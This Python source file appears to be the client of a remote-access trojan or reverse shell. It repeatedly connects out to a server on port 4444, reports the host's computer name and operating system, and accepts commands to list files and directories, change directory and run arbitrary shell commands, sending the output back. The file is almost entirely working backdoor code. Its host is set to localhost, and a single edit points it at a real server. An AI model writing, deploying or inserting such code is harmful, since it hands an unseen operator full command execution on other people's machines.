import socket, os, sys, time, base64, extra, platform, subprocess, pathlib
data = [os.environ['COMPUTERNAME'], platform.system()]

currentDirectory = os.getcwd()

chunkSize = 1

IP = 'localhost'
PORT = 4444

def connect(host, port):
	notConnected = True
	while notConnected:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((host, port))
			#print("Connected: Sending Data:", "Stuff")
			#str(os.environ['COMPUTERNAME']) + ',' + platform.system()
			#s.send("PC 1,Windows")
			notConnected = False

		except:
			pass


	s.send((str(data[0]) + "," + str(data[1])).encode("utf8"))
	return s

def checkCommand(data, command):
	if data[:len(command)] == command:
		return [True, data[len(command):]]
	else:
		return [False, ""]

def send(conn, data):
	try:
		print("Sending Data Of Length: " + str(sys.getsizeof(data.encode("utf8"))))
		conn.send(data.encode("utf8"))
	except:
		pass
		
startingDir = os.getcwd()
while True:


	conn = connect(IP, PORT)

	active = True
	currentDirectory = startingDir

	while active:
		try:
			data = conn.recv(1024 * chunkSize).decode()
			if data == "":
				continue

			if data == "Checking If Alive":
				continue

			if data == "disconnect":
				active = False
				print("Disconnecting Client")
				conn.close()
				continue

			if data == "getCwd":
				send(conn, currentDirectory)
				continue

			if data == "getFiles":
				filesList = pathlib.Path(currentDirectory)
				files = []
				for file in filesList.iterdir():
					if os.path.isfile(file.name):
						files.append(file.name)

				files = ",".join(files)

				send(conn, files)
				continue

			if data == "getDirs":
				filesList = pathlib.Path(currentDirectory)
				files = []
				files.append("..")
				for file in filesList.iterdir():
					if not os.path.isfile(file.name):
						files.append(file.name)

				files = ",".join(files)

				send(conn, files)
				continue

			if checkCommand(data, "cd: ")[0]:
				args = os.path.join(currentDirectory,checkCommand(data, "cd: ")[1])
				print(args)
				if os.path.isdir(args):
					try:
						
						os.chdir(args)
						currentDirectory = os.getcwd()
						print("Changing Directory To: " + currentDirectory)
					except Exception as e:
						print("Could not change directory: " + str(e))

			if checkCommand(data, "shell: ")[0]:
				args = checkCommand(data, "shell: ")[1]

				if checkCommand(args, "cd ")[0]:
					try:
						os.chdir(checkCommand(args, "cd ")[1])
						currentDirectory = os.getcwd()
						send(conn, "cwd: " + currentDirectory)
					except Exception as e:
						send(conn, "Could Not Change To Directory: " + checkCommand(args, "cd ")[1] + ", " + str(e))
					continue

				try:
					output = subprocess.run(args, shell=True, check=True, capture_output=True).stdout.decode()
					send(conn, output)
				except Exception as e:
					print("Error Interpreting Command")
					send(conn, "Command '" + args + "' Is Invalid: " + str(e))
		except Exception as e:
			print(e)
			active = False
			try:
				conn.close()
			except:
				pass